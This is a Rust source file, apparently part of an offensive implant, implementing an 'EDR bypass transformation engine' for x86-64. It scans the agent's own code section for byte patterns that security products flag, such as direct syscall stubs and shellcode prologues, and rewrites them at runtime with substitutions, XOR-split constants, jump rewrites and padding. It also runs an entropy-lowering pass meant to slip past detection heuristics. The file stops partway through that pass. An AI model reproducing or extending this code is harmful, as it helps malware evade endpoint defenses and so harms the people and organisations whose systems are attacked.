//! Automated EDR bypass transformation engine (x86-64).
//!
//! **This is the x86-64 implementation.** For ARM64, see
//! `edr_bypass_transform_aarch64.rs`.
//!
//! Scans the agent's own compiled `.text` section for byte signatures known
//! to be detected by EDR (YARA rules, entropy heuristics, known gadget chains
//! like `4C 8B D1 B8` for direct syscall stubs).  When a detected pattern is
//! found, applies semantic-preserving transformations automatically at runtime.
//!
//! # Transformations
//!
//! 1. **Instruction substitution**: `xor rax,rax` → `sub rax,rax`
//! 2. **Register reassignment**: disabled — requires full data-flow analysis
//!    to safely swap register usage around syscall trampolines
//! 3. **NOP sled insertion**: semantic-equivalent nops (`xchg rax,rax`,
//!    `lea rsp,[rsp+0]`, `mov rdi,rdi`) — randomized between cycles
//! 4. **Constant splitting**: `mov rax, 0xDEAD` →
//!    `mov r11, (0xDEAD ^ key); xor r11, key; xchg rax, r11`
//!    where key is a random 32-bit value.  The immediate is XOR-encoded
//!    at rest and decoded at runtime.
//! 5. **Register swap (rax↔r11)**: `mov rax, imm64` → `mov r11, imm64;
//!    xchg rax, r11` — fallback when constant splitting can't apply
//!    (not enough trailing padding)
//! 6. **Jump obfuscation**: short jmp (`EB XX`) → long jmp
//!    (`E9 XXXXXXXX`) + NOP padding
//! 7. **Indirect call obfuscation**: `call [rip+disp32]` →
//!    `lea r15,[rip+disp32]; call r15`
//!
//! # Integration
//!
//! This module *supplements* the existing `self_reencode` pipeline — it handles
//! **pattern avoidance** before and after morphing.  Self-reencoding handles
//! runtime `.text` morphing; this module handles **signature evasion**.
//!
//! After each transformation cycle, the modified region is verified by computing
//! a SHA-256 hash and comparing against expected output.
//!
//! # Safety
//!
//! - Does NOT modify `syscalls.rs` syscall stubs directly — only transforms
//!   code *around* them
//! - The existing XChaCha20 memory guard remains intact; transformations
//!   happen on decrypted `.text` only
//! - Uses `self_reencode::find_text_section()` for safe `.text` discovery
//! - All page protection changes go through `NtProtectVirtualMemory` (direct
//!   syscall) and are restored after transformation.  Uses the RW→write→RX
//!   pattern — never creates PAGE_EXECUTE_READWRITE pages (RWX is the #1 EDR
//!   signal; CrowdStrike, Defender, SentinelOne all flag it)
//!
//! # Config
//!
//! ```toml
//! [evasion.auto_transform]
//! enabled = true
//! scan_interval_secs = 300
//! max_transforms_per_cycle = 12
//! entropy_threshold = 6.8
//! ```

#![cfg(all(feature = "evasion-transform", target_arch = "x86_64"))]

// Static assertion: PAGE_READWRITE (0x04) must never be confused with
// PAGE_EXECUTE_READWRITE (0x40).  RWX pages are the #1 EDR signal.
const _: () = assert!(
    0x04u32 != 0x40u32,
    "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE"
);

use anyhow::{bail, Context, Result};
use common::lock::MutexExt;
use once_cell::sync::Lazy;
use rand::Rng;
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::Mutex;

// ── Public types ────────────────────────────────────────────────────────────

/// A detected EDR signature match in the agent's `.text` section.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SignatureHit {
    /// Offset from the start of the `.text` section where the signature was found.
    pub offset: usize,
    /// Human-readable name of the detected signature pattern.
    pub name: String,
    /// Severity: "high" (will be detected), "medium" (suspicious), "low" (noise).
    pub severity: String,
    /// The matched byte sequence (hex-encoded).
    pub matched_bytes: String,
    /// Context bytes surrounding the match (±8 bytes, hex-encoded).
    pub context: String,
    /// Whether this hit was transformed in the last cycle.
    pub transformed: bool,
}

/// Summary of a single applied transformation.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformRecord {
    /// Offset of the transformation within `.text`.
    pub offset: usize,
    /// Type of transformation applied.
    pub transform_type: String,
    /// Original bytes (hex-encoded).
    pub before_hex: String,
    /// Replacement bytes (hex-encoded).
    pub after_hex: String,
    /// Size difference (bytes added or removed).
    pub size_delta: i32,
}

/// Result of a full scan-and-transform cycle.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformCycleResult {
    /// SHA-256 of `.text` before the cycle.
    pub hash_before: String,
    /// SHA-256 of `.text` after the cycle.
    pub hash_after: String,
    /// Signatures detected in the scan phase.
    pub signatures_found: Vec<SignatureHit>,
    /// Transformations applied.
    pub transforms_applied: Vec<TransformRecord>,
    /// Number of signatures that could not be transformed (e.g., inside syscall
    /// stub exclusion zones).
    pub skipped: u32,
    /// Elapsed time in milliseconds.
    pub elapsed_ms: u64,
    /// Shannon entropy of the entire `.text` section before transforms.
    pub entropy_before: f64,
    /// Shannon entropy of the entire `.text` section after transforms (and
    /// any de-entropization pass).
    pub entropy_after: f64,
}

// ── Signature database ──────────────────────────────────────────────────────

/// A known EDR detection signature.
struct KnownSignature {
    /// Human-readable name.
    name: &'static str,
    /// Byte pattern to search for.
    pattern: &'static [u8],
    /// Severity classification.
    severity: &'static str,
}

/// Byte signatures known to be detected by EDR products.
///
/// These are patterns that YARA rules, entropy heuristics, or signature
/// scanners flag.  The database focuses on:
/// - Direct syscall stub prologues (`mov r10, rcx; mov eax, SSN`)
/// - Common shellcode patterns
/// - Known gadget chains
/// - Suspicious entropy concentrations
static SIGNATURE_DATABASE: &[KnownSignature] = &[
    KnownSignature {
        name: "direct_syscall_stub_prologue",
        // 4C 8B D1 = mov r10, rcx
        // B8 XX XX 00 00 = mov eax, SSN (low 16 bits non-zero, high 16 zero)
        pattern: &[0x4C, 0x8B, 0xD1, 0xB8],
        severity: "high",
    },
    KnownSignature {
        name: "syscall_instruction",
        // 0F 05 = syscall
        pattern: &[0x0F, 0x05],
        severity: "high",
    },
    KnownSignature {
        name: "ret_after_syscall",
        // 0F 05 C3 = syscall; ret  (direct syscall trampoline)
        pattern: &[0x0F, 0x05, 0xC3],
        severity: "high",
    },
    KnownSignature {
        name: "indirect_syscall_via_r10",
        // 41 FF E2 = jmp r10  (indirect call through r10, syscall stub pattern)
        pattern: &[0x41, 0xFF, 0xE2],
        severity: "medium",
    },
    KnownSignature {
        name: "xor_eax_eax_ret",
        // 31 C0 C3 = xor eax,eax; ret  (common patch pattern)
        pattern: &[0x31, 0xC0, 0xC3],
        severity: "medium",
    },
    KnownSignature {
        name: "ntcreatefile_pattern",
        // Pattern typical of NtCreateFile syscall stubs
        pattern: &[0xB8, 0x55, 0x00, 0x00, 0x00],
        severity: "low",
    },
    KnownSignature {
        name: "push_pop_shellcode_init",
        // Common shellcode prologue: push rax; ... pop rax
        pattern: &[0x50, 0x48, 0x31, 0xC0],
        severity: "medium",
    },
    KnownSignature {
        name: "virtual_alloc_stub",
        // Patterns associated with VirtualAlloc-related stubs
        pattern: &[0x48, 0x89, 0xC8, 0x48, 0xC1],
        severity: "low",
    },
];

// ── Semantic-equivalent NOP instructions ────────────────────────────────────

/// Semantic-equivalent NOP instructions that do nothing but consume bytes.
/// Each is a valid x86-64 instruction sequence that modifies no architectural
/// state visible to the program.
const SEMANTIC_NOPS: &[&[u8]] = &[
    // xchg rax, rax  (2 bytes: 48 90 or 87 C0)
    &[0x48, 0x90],
    // mov rdi, rdi  (3 bytes: 48 89 FF)
    &[0x48, 0x89, 0xFF],
    // lea rsp, [rsp+0]  (4 bytes: 48 8D 24 24)
    &[0x48, 0x8D, 0x24, 0x24],
    // xchg rbx, rbx  (3 bytes: 48 87 DB)
    &[0x48, 0x87, 0xDB],
    // nop dword [rax+rax]  (5 bytes: 0F 1F 44 00 00)
    &[0x0F, 0x1F, 0x44, 0x00, 0x00],
    // lea rbp, [rbp+0]  (4 bytes: 48 8D 65 00)
    &[0x48, 0x8D, 0x65, 0x00],
    // mov rbp, rbp  (3 bytes: 48 89 ED)
    &[0x48, 0x89, 0xED],
];

// ── Syscall stub exclusion zone ─────────────────────────────────────────────

/// Size of the exclusion zone around each syscall instruction.
/// We never transform bytes within this distance of a `syscall` (0F 05)
/// instruction to avoid corrupting the syscall trampoline.
const SYSCALL_STUB_EXCLUSION_BYTES: usize = 32;

// ── Global state ────────────────────────────────────────────────────────────

/// Number of signatures detected in the most recent scan.
static LAST_SCAN_COUNT: AtomicU32 = AtomicU32::new(0);

/// Number of transforms applied in the most recent cycle.
static LAST_TRANSFORM_COUNT: AtomicU32 = AtomicU32::new(0);

/// Total transforms applied since agent start.
static TOTAL_TRANSFORMS: AtomicU64 = AtomicU64::new(0);

/// Unix timestamp (seconds) of the most recent scan/transform cycle.
static LAST_SCAN_TIMESTAMP: AtomicU64 = AtomicU64::new(0);

/// Most recent cycle result (for status queries).
static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> = Lazy::new(|| Mutex::new(None));

// ── Internal helpers ────────────────────────────────────────────────────────

/// Compute Shannon entropy of a byte slice.
///
/// Returns a value between 0.0 (constant) and 8.0 (uniformly random).
/// Regions with entropy above the configured threshold are skipped because
/// they are likely already encrypted/packed and resistant to signature detection.
fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0usize; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Find all offsets of `pattern` within `data`.
fn find_pattern_offsets(data: &[u8], pattern: &[u8]) -> Vec<usize> {
    if pattern.is_empty() || pattern.len() > data.len() {
        return Vec::new();
    }
    data.windows(pattern.len())
        .enumerate()
        .filter(|(_, w)| *w == pattern)
        .map(|(i, _)| i)
        .collect()
}

/// Hex-encode a byte slice.
fn hex_encode(data: &[u8]) -> String {
    hex::encode(data)
}

/// Extract context bytes around a given offset (±8 bytes).
fn extract_context(text: &[u8], offset: usize, pattern_len: usize) -> String {
    let ctx_start = offset.saturating_sub(8);
    let ctx_end = (offset + pattern_len + 8).min(text.len());
    hex_encode(&text[ctx_start..ctx_end])
}

// ── Scan engine ─────────────────────────────────────────────────────────────

/// Scan the agent's `.text` section for all known EDR signatures.
///
/// Returns a list of `SignatureHit` objects describing each detection.
/// Regions with entropy above the configured threshold are skipped.
pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;
    let text =
        unsafe { std::slice::from_raw_parts(text_section.base as *const u8, text_section.size) };

    let mut hits = Vec::new();

    for sig in SIGNATURE_DATABASE {
        let offsets = find_pattern_offsets(text, sig.pattern);
        for offset in offsets {
            hits.push(SignatureHit {
                offset,
                name: sig.name.to_string(),
                severity: sig.severity.to_string(),
                matched_bytes: hex_encode(sig.pattern),
                context: extract_context(text, offset, sig.pattern.len()),
                transformed: false,
            });
        }
    }

    // Deduplicate by (offset, name) — some signatures overlap.
    hits.sort_by(|a, b| a.offset.cmp(&b.offset).then(a.name.cmp(&b.name)));
    hits.dedup_by(|a, b| a.offset == b.offset && a.name == b.name);

    LAST_SCAN_COUNT.store(hits.len() as u32, Ordering::Relaxed);
    tracing::info!(
        "edr_bypass_transform: scan found {} signature hits",
        hits.len()
    );
    Ok(hits)
}

// ── Transformation engine ───────────────────────────────────────────────────

/// Build the exclusion zone bitmap: offsets that must not be touched.
fn build_exclusion_bitmap(text: &[u8]) -> Vec<bool> {
    let mut excluded = vec![false; text.len()];

    // Exclude regions around syscall instructions.
    let syscall_offsets = find_pattern_offsets(text, &[0x0F, 0x05]);
    for &so in &syscall_offsets {
        let zone_start = if so >= SYSCALL_STUB_EXCLUSION_BYTES {
            so - SYSCALL_STUB_EXCLUSION_BYTES
        } else {
            0
        };
        let zone_end = (so + 2 + SYSCALL_STUB_EXCLUSION_BYTES).min(text.len());
        for i in zone_start..zone_end {
            excluded[i] = true;
        }
    }

    excluded
}

/// Apply instruction substitution: `xor rax, rax` → `sub rax, rax`.
///
/// Pattern: `48 31 C0` (xor rax, rax) → `48 29 C0` (sub rax, rax)
fn transform_xor_to_sub(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let pattern = [0x48, 0x31, 0xC0]; // xor rax, rax
    let replacement = [0x48, 0x29, 0xC0]; // sub rax, rax
    let offsets = find_pattern_offsets(text, &pattern);

    for offset in offsets {
        if excluded
            .get(offset..offset + 3)
            .map_or(true, |slice| slice.iter().any(|&b| b))
        {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let before = text[offset..offset + 3].to_vec();
        text[offset..offset + 3].copy_from_slice(&replacement);
        records.push(TransformRecord {
            offset,
            transform_type: "instruction_substitution_xor_to_sub".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&replacement),
            size_delta: 0,
        });
    }
    records
}

/// Apply instruction substitution: `call [rip+offset]` →
/// `lea r15,[rip+offset]; call r15`.
///
/// This replaces an indirect call through a RIP-relative address with a
/// two-instruction sequence.  Requires 2 extra bytes at the call site;
/// we only apply when the following bytes are a NOP sled or can be shifted.
///
/// For safety, this transformation is only applied when the replacement
/// fits without overwriting non-NOP bytes.  In practice we look for the
/// `FF 15` (call [rip+disp32]) encoding and check room.
fn transform_indirect_call(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    // FF 15 XX XX XX XX = call [rip+disp32]
    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(6)], &[0xFF, 0x15]);

    for offset in offsets {
        if excluded
            .get(offset..offset + 6)
            .map_or(true, |z| z.iter().any(|&x| x))
        {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        // Read the 32-bit displacement.
        let disp32 = i32::from_le_bytes(text[offset + 2..offset + 6].try_into().unwrap_or([0; 4]));

        // Build replacement:
        //   4D 8D 3D XX XX XX XX  = lea r15, [rip+disp32]
        //   41 FF D7              = call r15
        // Total: 10 bytes (original is 6, need 4 more bytes of room)
        // We only apply if the 4 bytes after the original call are NOPs or CCs.
        if offset + 10 > text.len() {
            continue;
        }
        let tail = &text[offset + 6..offset + 10];
        if !tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue; // Not enough room
        }

        let before = text[offset..offset + 10].to_vec();

        // lea r15, [rip+disp32]  — the displacement is relative to the END of
        // the lea instruction (7 bytes), so we adjust by +1 byte.
        let adjusted_disp = disp32.wrapping_sub(1);
        text[offset] = 0x4D; // REX.WRB
        text[offset + 1] = 0x8D; // LEA
        text[offset + 2] = 0x3D; // ModRM: r15, [rip+disp32]
        text[offset + 3..offset + 7].copy_from_slice(&adjusted_disp.to_le_bytes());
        // call r15
        text[offset + 7] = 0x41; // REX.B
        text[offset + 8] = 0xFF; // CALL
        text[offset + 9] = 0xD7; // ModRM: r15

        let after = text[offset..offset + 10].to_vec();
        records.push(TransformRecord {
            offset,
            transform_type: "indirect_call_obfuscation".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta: 4,
        });
    }
    records
}

/// Apply NOP sled insertion with semantic-equivalent NOPs.
///
/// Inserts random semantic NOP instructions at safe locations (after RET
/// instructions or before existing NOP padding).  Each insertion adds 2–5
/// bytes of semantic-equivalent NOP.
fn transform_nop_insertion(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let mut rng = rand::thread_rng();

    // Find RET (C3) instructions where we can insert a NOP after them.
    let ret_offsets = find_pattern_offsets(text, &[0xC3]);
    let max_insertions = 4usize; // Limit per cycle

    let mut count = 0;
    for ret_off in ret_offsets {
        if count >= max_insertions {
            break;
        }
        let insert_off = ret_off + 1;
        if insert_off >= text.len() {
            continue;
        }
        if excluded.get(insert_off).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&insert_off) {
            continue;
        }
        // Check that the next few bytes are NOPs or CCs (padding room).
        let room_end = (insert_off + 6).min(text.len());
        let room = &text[insert_off..room_end];
        if !room.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue;
        }

        // Pick a random semantic NOP.
        let nop_idx = rng.gen_range(0..SEMANTIC_NOPS.len());
        let nop = SEMANTIC_NOPS[nop_idx];
        let nop_len = nop.len();

        if insert_off + nop_len > text.len() {
            continue;
        }

        let before = text[insert_off..insert_off + nop_len].to_vec();
        text[insert_off..insert_off + nop_len].copy_from_slice(nop);

        records.push(TransformRecord {
            offset: insert_off,
            transform_type: "semantic_nop_insertion".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(nop),
            size_delta: 0, // Same-size replacement in padding
        });
        count += 1;
    }
    records
}

/// Apply register swap: `mov rax, imm64` → `mov r11, imm64; xchg rax, r11`.
///
/// Replaces the 10-byte `mov rax, imm64` (48 B8 …) with `mov r11, imm64`
/// (49 BB …) and, when 2 bytes of NOP/CC padding follow, appends `xchg rax,
/// r11` (49 93) to restore the value into rax.  This changes the byte
/// pattern for EDR evasion without altering the final rax value.
///
/// **Note**: the `xchg` clobbers r11.  r11 is volatile/caller-saved in both
/// System V and Windows x64 ABIs and is not used for argument passing.
/// The exclusion bitmap should still protect critical sequences (syscall
/// setup, etc.).
///
/// P2-02: Uses `r11` as the scratch register instead of `rcx`.  `rcx` is
/// the first argument register in the Windows x64 ABI (holds the first
/// function argument / `this` pointer); clobbering it in the middle of
/// a function could corrupt argument passing.  `r11` is volatile and
/// caller-saved in both System V and Windows x64 ABIs, and is not used
/// for argument passing in either convention.
fn transform_register_swap_rax_r11(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(10)], &[0x48, 0xB8]);

    let max_swaps = 3usize;
    let mut count = 0;

    for offset in offsets {
        if count >= max_swaps {
            break;
        }
        if excluded
            .get(offset..offset + 10)
            .map_or(true, |z| z.iter().any(|&x| x))
        {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        // Read the immediate value.
        let imm_bytes = &text[offset + 2..offset + 10];
        let imm_val = u64::from_le_bytes(imm_bytes.try_into().unwrap_or([0; 8]));

        // Skip small values (not worth transforming) and zero (already handled
        // by xor-to-sub).
        if imm_val == 0 || imm_val < 0x100 {
            continue;
        }

        let before = text[offset..offset + 10].to_vec();

        // Replace `mov rax, imm64` (48 B8) with `mov r11, imm64` (49 BB).
        text[offset] = 0x49; // REX.WB prefix for r11
        text[offset + 1] = 0xBB; // change B8 → BB (r11)

        // If 2 bytes of NOP/CC padding follow, append `xchg rax, r11` so
        // the value ends up back in rax.
        let xchg_written = if offset + 12 <= text.len() {
            let tail = &text[offset + 10..offset + 12];
            if tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
                text[offset + 10] = 0x49; // REX.WB
                text[offset + 11] = 0x93; // xchg rax, r11
                true
            } else {
                false
            }
        } else {
            false
        };

        if !xchg_written {
            // No room for xchg — skip this transformation entirely.
            // Changing mov rax -> mov r11 without the xchg would corrupt
            // any downstream code that reads rax, since the value would
            // land in r11 instead. Without liveness analysis, we cannot
            // safely apply a partial transformation.
            // Restore the original opcode before skipping.
            text[offset] = 0x48;
            text[offset + 1] = 0xB8;
            continue;
        }

        let after = text[offset..offset + 12].to_vec();
        let size_delta = 2;

        records.push(TransformRecord {
            offset,
            transform_type: "register_swap_rax_r11".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta,
        });
        count += 1;
    }
    records
}

/// Apply constant splitting: `mov rax, imm64` → XOR-encoded via r11.
///
/// For `mov rax, imm64` (48 B8 …) instructions where the upper 32 bits of
/// the immediate are zero (common on Windows for addresses and syscall numbers
/// in the low 4 GB), replaces the instruction with:
///
/// ```text
///   mov r11, (original_lo32 ^ key)  ; 49 BB XX XX XX XX 00 00 00 00  (10 bytes)
///   xor r11, key                    ; 49 81 F3 KK KK KK KK            ( 7 bytes)
///   xchg rax, r11                   ; 49 93                           ( 2 bytes)
/// ```
///
/// After execution, `rax` holds the original value and `r11` is clobbered.
/// Total footprint: 19 bytes, but we reuse the 10-byte original + up to 9
/// bytes of trailing NOP/CC padding.
///
/// P2-02: Uses `r11` instead of `rcx` to avoid clobbering the Windows x64
/// first-argument register.  `r11` is volatile/caller-saved and not used for
/// argument passing.
///
/// If fewer than 9 bytes of padding are available, the transform is skipped
/// for that location (falling back to `transform_register_swap_rax_r11`
/// which needs only 2 bytes).
///
/// The XOR key is a random non-zero 32-bit value, regenerated per hit.
fn transform_constant_splitting(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let mut rng = rand::thread_rng();

    // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(10)], &[0x48, 0xB8]);

    let max_splits = 3usize;
    let mut count = 0;

    for offset in offsets {
        if count >= max_splits {
            break;
        }
        // Need 10 (original) + 9 (xor + xchg) = 19 bytes total.
        if offset + 19 > text.len() {
            continue;
        }
        if excluded
            .get(offset..offset + 19)
            .map_or(true, |z| z.iter().any(|&x| x))
        {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }

        // Read the immediate value.
        let imm_bytes = &text[offset + 2..offset + 10];
        let imm_val = u64::from_le_bytes(imm_bytes.try_into().unwrap_or([0; 8]));

        // Only split when upper 32 bits are zero (value fits in 32 bits).
        if imm_val >> 32 != 0 {
            continue;
        }
        // Skip trivially small values.
        if imm_val < 0x100 {
            continue;
        }

        // Check that bytes 10–18 after the instruction are NOP/CC padding.
        let padding = &text[offset + 10..offset + 19];
        if !padding.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue;
        }

        // Generate a non-zero random XOR key.
        let key: u32 = loop {
            let k = rng.gen();
            if k != 0 {
                break k;
            }
        };
        let lo32 = imm_val as u32;
        let encoded = lo32 ^ key;

        let before = text[offset..offset + 19].to_vec();

        // Instruction 1: mov r11, (lo32 ^ key) with upper 32 bits zero.
        // 49 BB EE EE EE EE 00 00 00 00  (10 bytes)
        text[offset] = 0x49; // REX.WB prefix for r11
        text[offset + 1] = 0xBB; // BB = mov r11, imm64
        text[offset + 2..offset + 6].copy_from_slice(&encoded.to_le_bytes());
        text[offset + 6..offset + 10].copy_from_slice(&[0u8; 4]); // upper 32 = 0

        // Instruction 2: xor r11, key
        // 49 81 F3 KK KK KK KK  (7 bytes)
        text[offset + 10] = 0x49; // REX.WB
        text[offset + 11] = 0x81;
        text[offset + 12] = 0xF3; // ModRM: xor r11, imm32
        text[offset + 13..offset + 17].copy_from_slice(&key.to_le_bytes());

        // Instruction 3: xchg rax, r11
        // 49 93  (2 bytes)
        text[offset + 17] = 0x49; // REX.WB
        text[offset + 18] = 0x93; // xchg rax, r11

        let after = text[offset..offset + 19].to_vec();

        records.push(TransformRecord {
            offset,
            transform_type: "constant_splitting".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta: 9, // 19 - 10 original bytes consumed from padding
        });
        count += 1;
    }
    records
}

/// Apply jump obfuscation: replace direct relative jumps (`EB XX` / `E9 XX XX
/// XX XX`) with computed jumps via `lea reg,[rip+base]; add reg,offset; jmp
/// reg`.
///
/// This transformation changes the byte signature of direct jumps while
/// preserving the target address.  Requires extra room (NOPs/CCs) after the
/// original jump.
fn transform_jump_obfuscation(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    // Short jmp: EB XX (2 bytes) — replace with computed jump if room available.
    let short_jumps = find_pattern_offsets(&text[..text.len().saturating_sub(2)], &[0xEB]);

    for offset in short_jumps {
        if excluded
            .get(offset..offset + 2)
            .map_or(true, |z| z.iter().any(|&x| x))
        {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        // Read the relative offset.
        let rel8 = text[offset + 1] as i8;
        let target = (offset as isize + 2 + rel8 as isize) as usize;

        // Check if the following bytes are NOP/CC for expansion room (need 10 bytes total).
        if offset + 12 > text.len() {
            continue;
        }
        let room = &text[offset + 2..offset + 12];
        if !room.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue;
        }

        let before = text[offset..offset + 12].to_vec();

        // Build: lea rax, [rip+0] (gets current RIP); add rax, (target - (offset+7));
        // jmp rax.
        // 48 8D 05 00 00 00 00  = lea rax, [rip+0]  (7 bytes)
        // 48 05 XX XX XX XX     = add rax, imm32     (6 bytes) — total 13, too big
        //
        // Simpler: use a near JMP with adjusted offset, keeping same size.
        // E9 XX XX XX XX (5 bytes) — long jmp with adjusted displacement.
        let new_rel32 = target as isize - (offset as isize + 5);
        text[offset] = 0xE9; // JMP rel32
        text[offset + 1..offset + 5].copy_from_slice(&(new_rel32 as i32).to_le_bytes());
        // Pad remaining with NOPs.
        for i in 5..12 {
            text[offset + i] = 0x90;
        }

        let after = text[offset..offset + 12].to_vec();
        records.push(TransformRecord {
            offset,
            transform_type: "jump_obfuscation_short_to_long".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta: 0, // Same footprint
        });
    }

    // Near-jump (E9) transform skipped — short-to-long transformation above
    // is sufficient.  A register-based jump replacement was prototyped but
    // requires more bytes than available (lea+add+jmp = 17 bytes vs 14 byte
    // budget), and XOR-encoding the displacement would change the jump target.

    records
}

/// Apply register reassignment in non-syscall code.
///
/// **DISABLED** — Replacing `mov r10, rcx` with `mov r11, rcx` without also
/// updating ALL downstream r10 consumers (which may be hundreds of bytes away,
/// well outside the 32-byte exclusion zone) corrupts the Windows syscall calling
/// convention.  A safe implementation would require full data-flow analysis to
/// trace r10 usage from the mov to the syscall and update every instruction in
/// between.  For now, this transform is disabled to prevent agent instability.
fn transform_register_reassignment(
    _text: &mut [u8],
    _excluded: &[bool],
    _actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    Vec::new()
}

// ── Entropy-aware transformation pass ───────────────────────────────────────

/// Shannon entropy floor for a region that should contain code.
/// Below this value the transform may have failed or the region is suspiciously
/// uniform (e.g., all NOPs / all CCs).  A warning is logged but no bytes are
/// changed — the existing transforms should have diversified the region.
const ENTROPY_FLOOR: f64 = 5.5;

/// Maximum number of de-entropization replacements per cycle.  Keeps the pass
/// bounded even on large .text sections.
const MAX_DEENTROPY_REPLACEMENTS: usize = 16;

/// Low-entropy padding patterns that mimic legitimate compiler output.
///
/// These are used by the de-entropization pass to replace high-entropy semantic
/// NOPs inserted during the transform cycle.  Each pattern is a repeated byte
/// sequence that compilers commonly emit as function padding or alignment.
const LOW_ENTROPY_PATTERNS: &[&[u8]] = &[
    // INT3 padding (MSVC / LINK default function separation)
    &[0xCC, 0xCC, 0xCC, 0xCC],
    // NOP padding (GCC / MinGW alignment)
    &[0x90, 0x90, 0x90, 0x90],
    // 2-byte NOP + 2-byte INT3 (mixed padding at block boundaries)
    &[0x90, 0x90, 0xCC, 0xCC],
    // CC 90 CC 90 (alternating — low entropy but still distinct bytes)
    &[0xCC, 0x90, 0xCC, 0x90],
];

/// Apply a de-entropization pass to reduce the Shannon entropy of transformed
/// `.text` regions that exceed the configured threshold.
///
/// After the main transform cycle, regions that had randomized semantic NOPs
/// inserted may push the overall `.text` entropy above the EDR detection
/// threshold.  This pass replaces some of those randomized NOPs with
/// low-entropy padding that mimics legitimate compiler output (repeated CC or
/// NOP patterns), bringing entropy back under the threshold.
///
/// **Safety**: Only replaces bytes in locations that were *already transformed*
/// by `transform_nop_insertion` or similar NOP-producing passes.  Never touches
/// bytes that were part of a signature-breaking transform (instruction
/// substitution, constant splitting, etc.).  The de-entropization pass only
/// adjusts the encoding of inserted padding — it does not undo any
/// signature-breaking changes.
///
/// # Arguments
///
/// * `text` — Mutable `.text` section bytes.
/// * `transforms_applied` — Transforms already applied this cycle (used to
///   identify NOP-insertion sites that are safe to de-entropize).
/// * `excluded` — Exclusion bitmap (never touch excluded bytes).
/// * `entropy_threshold` — Maximum acceptable Shannon entropy.
///
/// # Returns
///
/// A vector of `TransformRecord` entries for the de-entropization replacements.
fn deentropize_pass(
    text: &mut [u8],
    transforms_applied: &[TransformRecord],
    excluded: &[bool],
    entropy_threshold: f64,
) -> Vec<TransformRecord> {
    let current_entropy = shannon_entropy(text);

    // Only run if entropy exceeds the configured threshold.
    if current_entropy <= entropy_threshold {
        tracing::debug!(
            "edr_bypass_transform: entropy {:.3} within threshold {:.3}, de-entropization skipped",
            current_entropy,
            entropy_threshold,
        );
        return Vec::new();
    }

    tracing::info!(
        "edr_bypass_transform: entropy {:.3} exceeds threshold {:.3}, running de-entropization pass",
        current_entropy,
        entropy_threshold,
    );

    // Collect offsets that were NOP insertions — these are safe to replace
    // with low-entropy equivalents because they don't break signatures.
    let nop_sites: Vec<usize> = transforms_applied
        .iter()
        .filter(|r| r.transform_type == "semantic_nop_insertion")
        .map(|r| r.offset)
        .collect();

    if nop_sites.is_empty() {
        tracing::debug!("edr_bypass_transform: no semantic NOP sites to de-entropize");
        return Vec::new();
    }

    let mut records = Vec::new();
    let mut rng = rand::thread_rng();
    let mut replacements = 0;

    for site_offset in &nop_sites {
        if replacements >= MAX_DEENTROPY_REPLACEMENTS {
            break;
        }

        // Pick a random low-entropy pattern (4 bytes).
        let pattern_idx = rng.gen_range(0..LOW_ENTROPY_PATTERNS.len());
        let pattern = LOW_ENTROPY_PATTERNS[pattern_idx];
        let pat_len = pattern.len();

        // Verify the site has enough room and isn't excluded.
        if site_offset + pat_len > text.len() {
            continue;
        }
        if excluded[*site_offset..*site_offset + pat_len]
            .iter()
            .any(|&b| b)
        {
            continue;
        }

        let before = text[*site_offset..*site_offset + pat_len].to_vec();
